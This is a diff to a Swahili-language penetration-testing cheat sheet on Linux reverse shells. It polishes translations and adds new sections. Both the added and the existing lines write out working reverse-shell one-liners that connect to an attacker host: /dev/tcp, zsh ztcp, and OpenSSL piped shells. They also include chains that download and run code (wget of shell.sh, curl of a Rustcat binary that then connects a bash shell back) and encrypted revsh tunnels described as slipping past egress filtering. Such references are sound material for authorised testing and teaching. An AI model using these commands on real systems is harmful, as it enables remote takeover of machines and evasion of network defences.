@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Ikiwa una maswali kuhusu yoyote ya hizi shells unaweza kuangalia na** [**https://explainshell.com/**](https://explainshell.com)
+**Ikiwa una maswali kuhusu yoyote ya hizi shells unaweza kuyakagua na** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
@@ -40,18 +40,18 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 - Kwa **kuhamasisha pato na mstreams ya makosa kwenda kwa faili hii**, amri hiyo kwa ufanisi inatuma pato la kikao cha shell ya kuingiliana kwa mashine ya mshambuliaji.
 4. **`0>&1`**: Sehemu hii ya amri **inaelekeza ingizo la kawaida (`stdin`) kwenda mahali pamoja na pato la kawaida (`stdout`)**.
 
-### Unda katika faili na uendeleze
+### Unda katika faili na utekeleze
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Forward Shell
 
-Wakati wa kushughulikia **Remote Code Execution (RCE)** udhaifu ndani ya programu ya wavuti inayotumia Linux, kupata reverse shell kunaweza kuzuia na ulinzi wa mtandao kama sheria za iptables au mifumo ya kuchuja pakiti ngumu. Katika mazingira kama haya, njia mbadala inahusisha kuanzisha PTY (Pseudo Terminal) shell ili kuingiliana na mfumo ulioathirika kwa ufanisi zaidi.
+Wakati wa kushughulikia **Remote Code Execution (RCE)** udhaifu ndani ya programu ya wavuti inayotumia Linux, kupata reverse shell kunaweza kuzuia na ulinzi wa mtandao kama sheria za iptables au mifumo ya kuchuja pakiti ngumu. Katika mazingira kama haya, njia mbadala ni kuanzisha PTY (Pseudo Terminal) shell ili kuingiliana na mfumo ulioathirika kwa ufanisi zaidi.
 
-Zana inayopendekezwa kwa ajili ya hili ni [toboggan](https://github.com/n3rada/toboggan.git), ambayo inarahisisha mwingiliano na mazingira ya lengo.
+Zana inayopendekezwa kwa kusudi hili ni [toboggan](https://github.com/n3rada/toboggan.git), ambayo inarahisisha mwingiliano na mazingira ya lengo.
 
-Ili kutumia toboggan kwa ufanisi, tengeneza moduli ya Python iliyoundwa kwa muktadha wa RCE wa mfumo wako wa lengo. Kwa mfano, moduli inayoitwa `nix.py` inaweza kuandikwa kama ifuatavyo:
+Ili kutumia toboggan kwa ufanisi, tengeneza moduli ya Python iliyoundwa kwa muktadha wa RCE wa mfumo wako wa lengo. Kwa mfano, moduli inayoitwa `nix.py` inaweza kuandaliwa kama ifuatavyo:
 ```python3
 import jwt
 import httpx
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (built-in TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – msikilizaji wa kisasa kama netcat ulioandikwa kwa Rust (imewekwa kwenye Kali tangu 2024).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Features:
+- Optional `--ssl` flag for encrypted transport (TLS 1.3)
+- `-s` to spawn any binary (e.g. `/bin/sh`, `python3`) on the victim
+- `--up` to automatically upgrade to a fully interactive PTY
+
+## revsh (encrypted & pivot-ready)
+
+`revsh` ni mteja/server mdogo wa C unaotoa TTY kamili kupitia **tunnel ya Diffie-Hellman iliyosimbwa** na inaweza kuambatanisha **TUN/TAP** interface kwa ajili ya pivoting kama VPN ya kurudi.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Useful flags:
+- `-b` : bind-shell badala ya reverse
+- `-p socks5://127.0.0.1:9050` : proxy kupitia TOR/HTTP/SOCKS
+- `-t` : tengeneza kiunganishi cha TUN (reverse VPN)
+
+Kwa sababu kikao chote kimefungwa na kuunganishwa, mara nyingi hupita uchujaji rahisi wa egress ambao ungeua shell ya maandiko ya wazi `/dev/tcp`.
+
 ## OpenSSL
 
 Mshambuliaji (Kali)
@@ -227,7 +269,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Mtu wa Kuteswa
+Mtu waathirika
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -259,7 +301,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Ili kutuma amri, andika chini, bonyeza enter na bonyeza CTRL+D (kuacha STDIN)
+Ili kutuma amri, iandike, bonyeza enter na bonyeza CTRL+D (kuacha STDIN)
 
 **Mtu aliyeathirika**
 ```bash
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
